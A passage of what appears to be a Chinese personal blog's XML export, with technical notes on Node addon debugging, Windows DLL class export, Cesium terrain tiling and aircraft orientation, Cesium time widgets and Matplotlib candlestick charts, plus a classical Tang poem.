    <content type="text"><![CDATA[最近研究如何在Vistual Studio 2017社区版中调试Node addon C++插件，遇到很多问题，花费了不少时间，为防止遗忘，将方法记录下来。 准备工作 安装VS2017社区版 安装python 2.7 安装Nodejs 8.11.3 LTS 下载Nodejs 8.11.3 LTS源码 安装配置环境 安装node-gyp和nannode-gyp和nan用于编译生成node addon 插件。 12npm install -g node-gypnpm install -g nan 编译nodejs源码在nodejs源码解压后文件夹中执行如下命令： 1.\vcbuild.bat debug x64 创建nodejs addon c++插件示例工程使用如下命名生成调试用的vs工程： 1node-gyp configure rebuild --nodedir=&quot;D:\project\cpp_project\node-v8.11.3&quot; --debug 修改测试用的index.js,使其调用上一步骤生成的调试用的插件 //该js调用生成的插件 var addon = require(&#39;./build/Debug/max&#39;); var y=addon.max(2,3); console.log(y); 使用VS2017打开插件示例工程的build文件夹下node-gyp生成的解决方案。右键单击工程，在上下文菜单中点击属性，配置其调试命令和命令参数，如下图所示。 设置断点进行调试 参考链接 https://blog.csdn.net/zcyzsy/article/details/72821755, by Zmyths. https://computer-vision-talks.com/how-to-debug-nodejs-addons-in-visual-studio/.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DLL导出类和函数]]></title>
    <url>%2F2018%2F06%2F15%2FDLL%E5%AF%BC%E5%87%BA%E7%B1%BB%E5%92%8C%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[最近研究在DLL中导出类，探寻最佳的DLL导出类的方法和技术。把整个过程记录一下，防止遗忘。 基础知识动态链接库动态链接库（英语：Dynamic-link library，缩写为DLL）是微软公司在微软视窗操作系统中实现共享函数库概念的一种实现方式。这些库函数的扩展名是.DLL、.OCX（包含ActiveX控制的库）或者.DRV（旧式的系统驱动程序)。 所谓动态链接，就是把一些经常会共用的代码（静态链接的OBJ程序库）制作成DLL档，当可执行文件调用到DLL档内的函数时，Windows操作系统才会把DLL档加载存储器内，DLL档本身的结构就是可执行档，当程序有需求时函数才进行链接。通过动态链接方式，存储器浪费的情形将可大幅降低。静态链接库则是直接链接到可执行文件。 编写方法使用DLL导出C函数或全局变量很简单，具体代码如下：12345678910111213141516171819// 下列 ifdef 块是创建使从 DLL 导出更简单的// 宏的标准方法。此 DLL 中的所有文件都是用命令行上定义的 DLLDEMO_EXPORTS// 符号编译的。在使用此 DLL 的// 任何其他项目上不应定义此符号。这样，源文件中包含此文件的任何其他项目都会将// DLLDEMO_API 函数视为是从 DLL 导入的，而此 DLL 则将用此宏定义的// 符号视为是被导出的。#ifdef DLLDEMO_EXPORTS#define DLLDEMO_API __declspec(dllexport)#else#define DLLDEMO_API __declspec(dllimport)#endifextern &quot;C&quot; extern DLLDEMO_API int nDllDemo;//不使用extern &quot;C&quot;将导致函数名字改编DLLDEMO_API int fnDllDemo(int);extern &quot;C&quot; DLLDEMO_API int fnExternCDllDemo(int); 运行时通知DLL进程/线程加载进程/线程加载时，可以通过DllMain函数通知DLL相关信息，提供对应处理的机会。12345678910111213141516171819BOOL WINAPI DLLMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID fImpLoad)&#123; switch(fdwReason) &#123; case DLL_PROCESS_ATTACH: //当这个DLL第一次被映射到了这个进程的地址空间时。DLLMain函数的返回值为FALSE，说明DLL的初始化没有成功，系统就会终结整个进程，去掉所有文件映象，之后显示一个对话框告诉用户进程不能启动。 break; case DLL_THREAD_ATTACH: //一个线程被创建，新创建的线程负责执行这次的DllMain函数。系统不会让进程已经存在的线程以DLL_THREAD_ATTACH的值来调用DllMain函数。主线程永远不会以DLL_THREAD_ATTACH的值来调用DllMain函数。系统是顺序调用DllMain函数的，一个线程执行完DllMain函数才会让另外一个线程执行DllMain函数。 break; case DLL_THREAD_DETACH: //如果线程调用了ExitThread来结束线程（线程函数返回时，系统也会自动调用ExitThread）。线程调用了TerminateThread，系统就不会用值DLL_THREAD_DETACH来调用所有DLL的DllMain函数。 break; case DLL_PROCESS_DETACH: //这个DLL从进程的地址空间中解除映射。如果进程的终结是因为调用了TerminateProcess，系统就不会用DLL_PROCESS_DETACH来调用DLL的DllMain函数。这就意味着DLL在进程结束前没有机会执行任何清理工作。 break; &#125; return(TRUE);&#125; DLL的静态调用方法采用静态调用方法，DLL最终将打包到生成的EXE中。静态调用方法步骤如下[2]： 把你的youApp.DLL拷到你目标工程(需调用youApp.DLL的工程)的Debug目录下; 把你的youApp.lib拷到你目标工程(需调用youApp.DLL的工程)目录下; 把你的youApp.h(包含输出函数的定义)拷到你目标工程(需调用youApp.DLL的工程)目录下; 打开你的目标工程选中工程,选择Visual C++的Project主菜单的Settings菜单; 执行第4步后，VC将会弹出一个对话框，在对话框的多页显示控件中选择Link页。然后在Object/library modules输入框中输入:youApp.lib 选择你的目标工程Head Files加入：youApp.h文件; 最后在你目标工程(*.cpp,需要调用DLL中的函数)中包含你的:#include “youApp.h” DLL的动态调用方法动态调用DLL的步骤： 创建一个函数指针，其指针数据类型要与调用的DLL引出函数相吻合。 通过Win32 API函数LoadLibrary()显式的调用DLL，此函数返回DLL的实例句柄。 通过Win32 API函数GetProcAddress()获取要调用的DLL的函数地址, 把结果赋给自定义函数的指针类型。 使用函数指针来调用DLL函数。 最后调用完成后，通过Win32 API函数FreeLibrary()释放DLL函数。 123456789101112131415161718192021222324int main()&#123; HMODULE hModule = LoadLibrary(_T(&quot;DllDemo.dll&quot;)); typedef int(*TYPE_fnDllDemo) (int);//定义函数指针 typedef int(*TYPE_fnExternCDllDemo) (int);//定义函数指针 //创建类对象 CDllDemo* pCDllDemo = (CDllDemo*)malloc(sizeof(CDllDemo)); TYPE_fnDllDemo fnDllDemo = (TYPE_fnDllDemo)GetProcAddress(hModule, &quot;?fnDllDemo@@YAHH@Z&quot;); int *nDllDemo = (int *)GetProcAddress(hModule, &quot;nDllDemo&quot;); TYPE_fnExternCDllDemo fnExternCDllDemo = (TYPE_fnExternCDllDemo)GetProcAddress(hModule, &quot;fnExternCDllDemo&quot;); if (pCDllDemo != NULL) // printf(&quot;pCDllDemo-&gt;Max(32,42) = %d\n&quot;, pCDllDemo-&gt;Max(32, 42));//Dll导出类的调用太麻烦，因为DLL本来就是为C函数服务设计的。 if (fnDllDemo != NULL) printf(&quot;fnDllDemo(32) = %d\n&quot;, fnDllDemo(32)); if (nDllDemo != NULL) printf(&quot;*nDllDemo = %d\n&quot;, *nDllDemo); if (fnExternCDllDemo != NULL) printf(&quot;fnExternCDllDemo(22) = %d\n&quot;, fnExternCDllDemo(22)); _tsystem(_T(&quot;pause&quot;)); FreeLibrary(hModule); return 0;&#125; COM技术COM主要是一套给C/C++用的接口，当然为了微软的野心，它也被推广到了VB、Delphi以及其他一大堆奇奇怪怪的平台上。它主要为了使用dll发布基于interface的接口。我们知道dll的接口是为了C设计的，它导出的基本都是C的函数，从原理上来说，将dll加载到内存之后，会告诉你一组函数的地址，你自己call进去就可以调用相应的函数[3]。 但是对于C++来说这个事情就头疼了，现在假设你有一个类，我们知道使用一个类的第一步是创建这个类：new MyClass()。这里直接就出问题了，new方法通过编译器计算MyClass的大小来分配相应的内存空间，但是如果库升级了，相应的类可能会增加新的成员，大小就变了，那么使用旧的定义分配出来的空间就不能在新的库当中使用。 要解决这问题，我们必须在dll当中导出一个CreateObject的方法，用来代替构造函数，然后返回一个接口。然而，接口的定义在不同版本当中也是有可能会变化的，为了兼容以前的版本同时也提供新功能，还需要让这个对象可以返回不同版本的接口。接口其实是一个只有纯虚函数的C++类，不过对它进行了一些改造来兼容C和其他一些编程语言。 在这样改造之后，出问题的还有析构过程~MyClass()或者说delete myClass，因为同一个对象可能返回了很多个接口，有些接口还在被使用，如果其中一个被人delete了，其他接口都会出错，所以又引入了引用计数，来让许多人可以共享同一个对象。 其实到此为止也并不算是很奇怪的技术，我们用C++有的时候也会使用Factory方法来代替构造函数实现某些特殊的多态，也会用引用计数等等。COM技术的奇怪地方在于微软实在是脑洞太大了，它们构造了一个操作系统级别的Factory，规定所有人的Interface都统一用UUID来标识，以后想要哪个Interface只要报出UUID来就行了。这样甚至连链接到特定的dll都省了。 这就好比一个COM程序员，只要他在Windows平台上，调用别的库就只要首先翻一下魔导书，查到了一个用奇怪文字写的“Excel = {xxx-xxx-xxxx…}”的记号，然后它只要对着空中喊一声：“召唤，Excel！CoCreateInstance, {xxx-xxx-xxxx…}”然后呼的从魔法阵里面窜出来了一个怪物，它长什么样我们完全看不清，因为这时候它的类型是IUnknow，这是脑洞奇大无比的微软为所有接口设计的一个基类。 我们需要进一步要求它变成我们能控制的接口形态，于是我们再喊下一条指令：“变身，Excel 2003形态！QueryInterface, {xxx-xxx-xxxx…}”QueryInterface使用的是另一个UUID，用来表示不同版本的接口。于是怪物就变成了我们需要的Excel 2003接口，虽然我们不知道它实际上是2003还是2007还是更高版本。等我们使唤完这只召唤兽，我们就会对它说“回去吧，召唤兽！Release！”但是它不一定听话，因为之前给它的命令也许还没有执行完，它会忠诚地等到执行完再回去，当然我们并不关心这些细节。 微软大概会觉得自己设计出了软件史上最完美的二进制接口，从今以后所有的第三方库都可以涵盖在这套接口之下。然而历史的车轮是无情的，它碾过那些自以为是的人的速度总是会比想象的更快。Java的直接基于类的接口被广泛应用，开发使用起来远远来的简单，即便偶尔出点问题大家也都想办法解决了，事实证明程序员并不愿意花10倍的编写代码的时间来解决二进制库的版本兼容问题，他们更愿意假装没看见。很快微软也抄了一个.NET托管dll的方案出来，于是纯的二进制接口COM就慢慢被抛弃了。 COM，OLE，ActiveX，OCX，VBScript，历史不会忘记你们的，如果历史忘了，我替历史记住你们。安息吧。 DLL导出类借鉴COM技术，这里直接给出DLL到处类的成熟方法，可有效避免DLL地狱问题。具体结构为： 导出类是一个派生类，派生自一个抽象类——都是纯虚函数。使用者需要知道这个抽象类的结构。DLL最少只需要提供一个用于获取类对象指针的接口。使用者跟DLL提供者共用一个抽象类的头文件，使用者依赖于DLL的东西很少，只需要知道抽象类的接口，以及获取对象指针的导出函数，对象内存空间的申请是在DLL模块中做的，释放也在DLL模块中完成,最后记得要调用释放对象的函数。 这种方式比较好，通用，产生的DLL没有特定环境限制。借助了C++类的虚函数。一般都是采用这种方式。除了对DLL导出类有好处外，采用接口跟实现分离，可以使得工程的结构更清晰，使用者只需要知道接口，而不需要知道实现。 具体代码如下： DLL导出类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//DLL导出类头文件MatureApproach.h，与DLL使用者共享#ifdef MATUREAPPROACH_EXPORTS#define MATUREAPPROACH_API __declspec(dllexport)#else#define MATUREAPPROACH_API __declspec(dllimport)#endifclass IExport &#123;public: virtual void Hi() = 0; virtual void Test() = 0; virtual void Release() = 0;&#125;;extern &quot;C&quot; MATUREAPPROACH_API IExport* _stdcall CreateExportObj();extern &quot;C&quot; MATUREAPPROACH_API void _stdcall DestroyExportObj(IExport* pExport);//DLL导出接口函数的实现MatureApproach.cpp#include &quot;stdafx.h&quot;#include &quot;MatureApproach.h&quot;#include &quot;ExportClassImpl.h&quot;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;MATUREAPPROACH_API IExport* APIENTRY CreateExportObj()&#123; return new ExportImpl;&#125;//这里不能直接delete pExport，因为没有把IExport的析构函数定义为虚函数MATUREAPPROACH_API void APIENTRY DestroyExportObj(IExport* pExport)&#123; pExport-&gt;Release();&#125; DLL导出类的具体实现 123456789101112131415161718192021222324252627282930313233343536//DLL导出类头文件ExportClassImpl.h#include &quot;MatureApproach.h&quot;class ExportImpl : public IExport&#123;public: virtual void Hi(); virtual void Test(); virtual void Release(); ~ExportImpl();private:&#125;;//DLL导出类的实现ExportClassImpl.cpp#include &quot;stdafx.h&quot;#include &quot;ExportClassImpl.h&quot;void ExportImpl::Hi()&#123; wcout &lt;&lt; L&quot;Hello World&quot; &lt;&lt; endl;&#125;void ExportImpl::Test()&#123; wcout &lt;&lt; L&quot;Hi cswuyg&quot; &lt;&lt; endl;&#125;void ExportImpl::Release()&#123; delete this;&#125;ExportImpl::~ExportImpl()&#123; cout &lt;&lt; &quot;Release OK&quot; &lt;&lt; endl;&#125; 参考链接 https://zh.wikipedia.org/wiki/动态链接库, by wikipedia http://www.cnblogs.com/micro-chen/p/5937428.html，by 特洛伊-Micro https://www.zhihu.com/question/49433640/answer/115952604, by 灵剑. http://www.cnblogs.com/cswuyg/archive/2011/10/06/DLL2.html，by 烛秋.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cesium卫星地图和高程数据切片经验总结]]></title>
    <url>%2F2018%2F06%2F13%2FCesium%E5%8D%AB%E6%98%9F%E5%9C%B0%E5%9B%BE%E5%92%8C%E9%AB%98%E7%A8%8B%E6%95%B0%E6%8D%AE%E5%88%87%E7%89%87%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[最近研究在Cesium中调用自定义的图像和地形，不借助任何GIS系统（如Arcgis、天地图等），方便在网络不好或离线的情况下使用。下面对整个过程进行总结。 基础知识地图服务提供方法目前互联网地图服务商提供的地图服务分成两种[3]： 图像瓦片地图服务这种方法目前最常见，其提供的是图片格式的瓦片，在客户端将拼接成真正的地图。 矢量瓦片地图服务这种方法正在发展，其提供矢量的瓦片数据，然后在客户端进行渲染，是今后的发展方向。 地图服务在使用过程中需要获取特定经纬度所在区域的瓦片和获取瓦片上像素点对应的经纬度，因此需要进行经纬度坐标与瓦片坐标、像素坐标的相互转换。 经纬度与瓦片编号互换互联网地图的经纬度坐标与瓦片坐标相互转换只与该地图商的墨卡托投影和瓦片编号的定义有关，跟地图商采用的大地坐标系标准无关。 经纬度与瓦片像素互换转换方式与地图商采用的大地坐标系有关。国际标准的经纬度坐标是WGS84。Open Street Map、外国版的Google Map都是采用WGS84；高德地图使用的坐标系是GCJ-02；百度地图使用的坐标系是BD-09。 地图投影地图投影，是指按照一定的数学法则将地球椭球面上的经纬网转换到平面上，使地面的地理坐标与平面直角坐标建立起函数关系。这是绘制地图的数学基础之一。由于地球是一个不可展的球体，使用物理方法将其展平会引起褶皱、拉伸和断裂，因此要使用地图投影实现由曲面向平面的转化。 麦卡托投影法麦卡托投影法 (Mercator projection)，又称麦卡托投影法、正轴等角圆柱投影，是一种等角的圆柱形地图投影法。本投影法得名于法兰德斯出身的地理学家杰拉杜斯·麦卡托，他于1569年发表长202公分、宽124公分以此方式绘制的世界地图。在以此投影法绘制的地图上，经纬线于任何位置皆垂直相交，使世界地图可以绘制在一个长方形上。由于可显示任两点间的正确方位，航海用途的海图、航路图大都以此方式绘制。在该投影中线型比例尺在图中任意一点周围都保持不变，从而可以保持大陆轮廓投影后的角度和形状不变（即等角）；但麦卡托投影会使面积产生变形，极点的比例甚至达到了无穷大。 图1 墨卡托投影示意图 各大地图服务商大都采用了Web Mercator进行投影，瓦片坐标系的不同主要是投影截取的地球范围不同、瓦片坐标起点不同[3]。 ## 瓦片切割和瓦片坐标 对于经过墨卡托投影为平面的世界地图，在不同的地图分辨率(整个世界地图的像素大小)下，通过切割的方式将世界地图划分为像素为256px/256px的地图单元，划分成的每一块地图单元称为地图瓦片。其特定如下： * 具有唯一的瓦片等级（Level）和瓦片坐标编号（tileX, tileY）。 * 瓦片分辨率为256*256。 * 最小的地图等级是0，此时世界地图只由一张瓦片组成。 * 瓦片等级越高，组成世界地图的瓦片数越多，可以展示的地图越详细。 * 某一瓦片等级地图的瓦片是由低一级的各瓦片切割成的4个瓦片组成，形成了瓦片金字塔。 过程总结将自定义图像和地形以Web形式发布后，在cesium中调用自定义图像和地形很简单，代码如下，关键是图像和地形的获取和处理。123456789101112131415var tmsImageryProvider=Cesium.createTileMapServiceImageryProvider(&#123; url:&apos;http://localhost:8080/test_tms_tiles&apos;&#125;);var terrainProvider=new Cesium.CesiumTerrainProvider(&#123; url:&apos;http://localhost:8080/terrain_tiles&apos;&#125;);var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;, &#123; imageryProvider : tmsImageryProvider, terrainProvider: terrainProvider, baseLayerPicker: false, geocoder: false, shadows: false, shouldAnimate: true&#125;) 卫星图像的获取和处理卫星图像获取可以使用一些相关软件，如水经注等。其原理通常是从一些地图服务商下载地图瓦片后重新拼接，再分割成对应格式的瓦片。拼接的图像最好输出为tif格式，因为tif格式可以在头部包含一些信息，例如地理坐标等信息，以方便后续的瓦片切割，以及被GIS系统直接识别导入。为使切割后的瓦片能够被Cesium直接调用，应采用标准TMS方式。通常卫星图像下载软件提供多种瓦片分割方式，如果能直接进行标准TMS瓦片分割最好不过，如果不可以进行标准TMS分割，则可使用GDAL。GDAL是地理空间数据抽象库的简称，是一个地理空间数据的格式转换及处理工具。文章最后将详细介绍其安装使用方法。使用GDAL进行卫星图像瓦片分割主要使用gdal2tiles.py工具。具体步骤如下： 选取之前下载拼接的最大分辨率的tif卫星图像 使用如下命令切割卫星图片,将自动生成瓦片金字塔。1gdal2tiles.py &lt;image&gt; &lt;tilesdir&gt; 地形的获取和处理Cesium支持多种地形provider来接收地形数据瓦片[8]： Cesium Terrain Server——高分辨率的全球地形数据，支持地形光照和水流效果。地形瓦片提交给客户端的数据的格式用的是quantized-mesh v1.0。 Esri ArcGIS Image Server——从Esri影像服务里的高度图中产生地形数据集。详情见Cesium里的ArcGisImageServerTerrainProvider. VR-TheWorld Server——从一个VR-TheWorld服务里的高度图中产生地形数据。它们的托管服务器有全球90米的数据，包括深度测量。 Ellipsoid——是Cesium默认的地形provider，是一个光滑的椭球面，没有现实的地形，地形高度为0。 常用的CesiumTerrainProvider支持两种格式的地形：一种是quantized-mesh格式的地形数据，另一种是基于高度图技术的DEM。前一种技术是Cesium独有不开放，因此将使用DEM数据在Cesium中渲染地形。 DEM数据是数字高程模型，是描述每个点位的高程数据，没有其他附加信息[9]。DEM数据在ArcGIS中打开只能看到是灰度图。通过相关软件可直接下载各大地图服务商的高程数据，但没有在Cesium中加载成功。下面介绍一种经过验证可在Cesium中成功加载地形的方法： 下载地形数据。可以从地理空间数据云下载地形数据，网址为http://www.gscloud.cn/。注册登录后，在首页选择“DEM 数字高程数据”，在选择“GDEMV2 30M 分辨率数字高程数据”。 合并地形数据。使用GDAL下的gdal_merge.py工具将下载的地形数据合并成一个Tif文件。 1gdal_merge.py -o out.tif input1.tif input2.tif 切割地形数据。使用牛人制作的gdal2srtmtiles.py脚本分割地形数据。编辑gdal2srtmtiles.py，在最后设置高程文件和输出目录。 发布地形服务。把terrain_tiles直接放到与 Cesium同端口的Tomcat或IIS站点下（不能跨域），即可发布服务。 需要在Web Server中增加配置 .terrain文件的 Content-Type设为 application/octet-stream，同时拷贝“覆盖至生成tiles结果”目录中的 layer.json文件和0文件夹至生成结果目录下，比如我当前是 terrain_tiles目录下。 GDAL的安装使用GDAL不推荐从源码编译安装，建议从gisinternals下载gdal-203-1911-x64-core.msi、GDAL-2.3.0.win-amd64-py2.7.msi直接二进制安装。安装步骤如下： 安装python2.7。安装完成后配置环境变量，在path中添加 C:\Python27; 安装gdal-203-1911-x64-core.msi。安装完成后，设置环境变量GDAL_DATA，值为C:\Program Files\GDAL\gdal-data\，修改环境变量PATH，增加C:\Program Files\GDAL; pip install numpy。这是为了使用地形切割的脚本gdal2srtmtiles.py。 安装GDAL-2.3.0.win-amd64-py2.7.msi。 参考链接 https://cesiumjs.org/tutorials/Imagery-Layers-Tutorial/, by cesiumjs https://cesiumjs.org/tutorials/Terrain-Tutorial/, by cesiumjs http://cntchen.github.io/2016/05/09/国内主要地图瓦片坐标系定义及计算原理/, by CntChen https://zh.wikipedia.org/wiki/地图投影, by wikipedia https://yanyinhong.github.io/2017/05/02/How-to-insert-image-in-hexo-post/, by Yan Yinhong https://blog.csdn.net/wbz810/article/details/79294511，by wbz810. http://www.gdal.org/，by gdal https://blog.csdn.net/u013929284/article/details/71616600, by Super洛伽 https://www.jianshu.com/p/62d6f03f44e3，by CrazyGIS]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cesium中飞行器姿态控制]]></title>
    <url>%2F2018%2F06%2F10%2FCesium%E4%B8%AD%E9%A3%9E%E8%A1%8C%E5%99%A8%E5%A7%BF%E6%80%81%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[问题提出最近研究开源虚拟地球Cesium，遇到一个问题：在获取飞行器经度纬度高度偏航俯仰滚转六个参数的前提下，如何在Cesium中用CZML文件表示，从而完美实现飞行器姿态轨迹的复现。在CZML的position属性中使用cartographicDegrees表示飞行器的经度纬度高度，可以很好复现飞行器的轨迹。然而在CZML的orientation属性中使用unitQuaternion表示飞机自身姿态时，飞机姿态总是不对。 问题分析基本知识在Cesium中存在两种常用坐标系： 世界坐标系世界坐标系统是以椭球中心为原点的笛卡尔空间直角坐标系。 地理坐标系地理坐标系即人们常用的使用经度、纬度、高度表示位置的坐标系。 站心坐标系又称为Earth-fixed coordinate system（站点坐标系、东-北-天坐标系ENU）。可分为站心直角坐标系和站心极坐标系。常用的站心直角坐标系定义为：以站心（如GPS接收天线中心）为坐标系原点O，Z轴与椭球法线重合，向上为正（天向），y与椭球短半轴重合（北向），x轴与地球椭球的长半轴重合（东向）所构成的直角坐标系，称为当地东北天坐标系（ENU）。飞行器的偏航、俯仰、滚转即是以站心直角坐标系为参考。 模型坐标系模型坐标系以物体的中心为坐标原点，物体旋转、平移等操作都是围绕局部坐标系进行的。这时当物体模型进行旋转、平移等操作时，局部坐标系也执行相应的旋转、平移等操作。局部坐标系是一个假想的坐标系，该坐标系与物体的相对位置至始至终是不变的，假想出这个坐标系的目的主要是为了正向理解对三维场景中物体执行的平移和旋转操作。使用局部坐标系理解模型变换时，所有的变换操作直接作用与局部坐标系，由于局部坐标系与物体的相对位置不变，因此对局部坐标系进行平移、旋转和缩放时，物体在场景中位置和形状也会发生相应的变化。 在Cesium中存在两种世界坐标系和地理坐标系之间坐标转换的方法：123456789# 经纬度转换为世界坐标Cesium.Cartesian3.fromDegrees(longitude, latitude, height, ellipsoid, result) # 世界坐标转换为经纬度var ellipsoid=viewer.scene.globe.ellipsoid;var cartesian3=new Cesium.cartesian3(x,y,z);var cartographic=ellipsoid.cartesianToCartographic(cartesian3);var lat=Cesium.Math.toDegrees(cartograhphic.latitude);var lng=Cesium.Math.toDegrees(cartograhpinc.longitude);var alt=cartographic.height; CZML分析CZML是一种用来描述动态场景的JSON架构的语言，主要用于Cesium在浏览器中的展示。它可以用来描述点、线、布告板、模型以及其他的图元，同时定义他们是怎样随时间变化的[3]。CZML可使用model属性直接加载3D模型，由position属性决定模型在世界坐标系内的位置，由orientation决定模型在世界坐标系内的姿态，并最终由orientation的unitQuaternion表示。unitQuaternion即单位四元数，可与偏航俯仰滚转相互转换，并避免偏航俯仰滚转的万向节锁定问题，但其本质上都是一个旋转矩阵，可决定模型在世界坐标系内的姿态。 获取正确的飞行器姿态首先计算飞行器模型坐标系对站点直角坐标系的旋转矩阵（在制作飞行器3D模型时，应使其中心在本地坐标系原点，机头机翼与轴平行，方便计算在站点直角坐标系内的旋转角度），再乘以由飞行器偏航俯仰滚转得到的旋转矩阵，再乘以站点直角坐标系对世界坐标系的旋转矩阵。将最终得到旋转矩阵转换为单位四元数，即得到正确的飞行器姿态。 解决方法参考代码如下：123456var lon=113,lat=34;//模型的站心经纬度var h1=0,p1=0,r1=0;//模型坐标系对站点坐标系的旋转角度var h2=0,p2=0,r2=0;//模型在站点坐标系的姿态var center = Cesium.Cartesian3.fromDegrees(lon, lat)var hpr = new Cesium.HeadingPitchRoll(h1+h2, p1+p2, r1+r2)var q1 = Cesium.Transforms.headingPitchRollQuaternion(center, hpr) 参考链接 https://stackoverflow.com/questions/43389069/cesium-how-to-animate-an-aircraft-from-pitch-roll-heading, by stackoverflow. https://blog.csdn.net/qq_34149805/article/details/78393540. by finalLi. http://www.cnblogs.com/laixiangran/p/4997971.html. by laixiangran. https://github.com/AnalyticalGraphicsInc/cesium/wiki/CZML-Structure. by AnalyticalGraphicsInc. 3D坐标系.https://www.jianshu.com/p/8d483fa1acbd. by S_H_C. 3D空间的坐标系. https://blog.csdn.net/trojanpizza/article/details/6652533. by trojanpizza.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[春江花月夜]]></title>
    <url>%2F2018%2F06%2F09%2F%E6%98%A5%E6%B1%9F%E8%8A%B1%E6%9C%88%E5%A4%9C%2F</url>
    <content type="text"><![CDATA[作者：张若虚 春江潮水连海平，海上明月共潮生。 滟滟随波千万里，何处春江无月明？ 江流宛转绕芳甸，月照花林皆似霰。 空里流霜不觉飞，汀上白沙看不见。 江天一色无纤尘，皎皎空中孤月轮。 江畔何人初见月，江月何年初照人？ 人生代代无穷已，江月年年祇相似。 不知江月待何人？但见长江送流水。 白云一片去悠悠，青枫浦上不胜愁。 谁家今夜扁舟子，何处相思明月楼？ 可怜楼上月徘徊，应照离人妆镜台。 玉户帘中卷不去，捣衣砧上拂还来。 此时相望不相闻，愿逐月华流照君。 鸿雁长飞光不度，鱼龙潜跃水成文。 昨夜闲潭梦落花，可怜春半不还家。 江水流春去欲尽，江潭落月复西斜。 斜月沉沉藏海雾，碣石潇湘无限路。 不知乘月几人归，落月摇情满江树。]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>唐诗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cesium小部件animation和timeline的系统时间显示]]></title>
    <url>%2F2018%2F06%2F09%2FCesium%E5%B0%8F%E9%83%A8%E4%BB%B6animation%E5%92%8Ctimeline%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E6%98%BE%E7%A4%BA%2F</url>
    <content type="text"><![CDATA[Cesium的小部件animation和timeline显示UTC系统时间，需要将其改为本地系统时间。修改方法如下：12345678910111213141516171819202122232425this.viewer.animation.viewModel.dateFormatter = localeDateTimeFormatterthis.viewer.animation.viewModel.timeFormatter = localeTimeFormatterthis.viewer.timeline.makeLabel = function (time) &#123; return localeDateTimeFormatter(time) &#125;// Date formatting to a global formfunction localeDateTimeFormatter(datetime, viewModel, ignoredate) &#123; var julianDT = new Cesium.JulianDate(); Cesium.JulianDate.addHours(datetime,8,julianDT) var gregorianDT= Cesium.JulianDate.toGregorianDate(julianDT) var objDT; if (ignoredate) objDT = &apos;&apos;; else &#123; objDT = new Date(gregorianDT.year, gregorianDT.month - 1, gregorianDT.day); objDT = gregorianDT.year + &apos;年&apos; +objDT.toLocaleString(&quot;zh-cn&quot;, &#123; month: &quot;short&quot; &#125;)+ gregorianDT.day + &apos;日&apos; ; if (viewModel || gregorianDT.hour + gregorianDT.minute === 0) return objDT; objDT += &apos; &apos;; &#125; return objDT + Cesium.sprintf(&quot;%02d:%02d:%02d&quot;, gregorianDT.hour, gregorianDT.minute, gregorianDT.second);&#125;function localeTimeFormatter(time, viewModel) &#123; return localeDateTimeFormatter(time, viewModel, true);&#125; 上述代码还存在一个问题，当timeline小部件不活动时，其仍然显示UTC标准系统时间。 参考链接 https://blog.csdn.net/chienchia/article/details/29185479, by chienchia. https://stackoverflow.com/questions/45875490/change-utc-timezone-to-sgt-timezone-in-cesiumjs, by stackoverflow.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Matplotlib蜡烛图绘制教程]]></title>
    <url>%2F2018%2F06%2F03%2FMatplotlib%E8%9C%A1%E7%83%9B%E5%9B%BE%E7%BB%98%E5%88%B6%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[股票分析离不开各种图表的绘制，尤其是最常用的蜡烛图。下面介绍python中使用matplotlib绘制蜡烛图的过程。 环境及配置使用的环境如下：123456789101112$ python3 --versionPython 3.6.5rc1$ ipython3In [1]: import matplotlibIn [2]: matplotlib.__version__Out[2]: &apos;2.2.2&apos;In [3]: import tushare as tsIn [4]: ts.__version__Out[4]: &apos;1.1.9&apos;In [5]: import talibIn [6]: talib.__version__Out[6]: &apos;0.4.17&apos; 绘制蜡烛图通常使用matplotlib.finance库，但这个库在matplotlib 2.0后已经被废弃，并被移到一个名叫mpl_finance的库中。可使用如下命令安装mpl_finance。1pip3 install https://github.com/matplotlib/mpl_finance/archive/master.zip mpl_finance使用雅虎接口获取股票数据，但是不稳定，因此推荐使用tushare库获取股票数据。另外使用talib计算股票各种技术分析指标，例如常用的均线数据。需要注意的是通过pip3按照的talib库是对C/C++版talib的包装，因此需先安装C/C++版talib。 蜡烛图绘制蜡烛图绘制函数简介mpl_finance库中蜡烛图的绘制主要有以下四个函数：1234candlestick2_ochl(ax, opens, closes, highs, lows, width=4, colorup=&apos;k&apos;, colordown=&apos;r&apos;, alpha=0.75)candlestick2_ohlc(ax, opens, highs, lows, closes, width=4, colorup=&apos;k&apos;, colordown=&apos;r&apos;, alpha=0.75)candlestick_ochl(ax, quotes, width=0.2, colorup=&apos;k&apos;, colordown=&apos;r&apos;, alpha=1.0)candlestick_ohlc(ax, quotes, width=0.2, colorup=&apos;k&apos;, colordown=&apos;r&apos;, alpha=1.0) 在这四个函数的使用过程中需要注意的是： candlestick2_ohlc函数假定opens, highs, lows, closes中任意一个值不存在，则其他值也不存在。 candlestick_ochl和candlestick_ohlc的输入参数quotes是(time, open, close, high, low, …)元组序列，其中time必须是浮点日期格式，具体参见date2num。 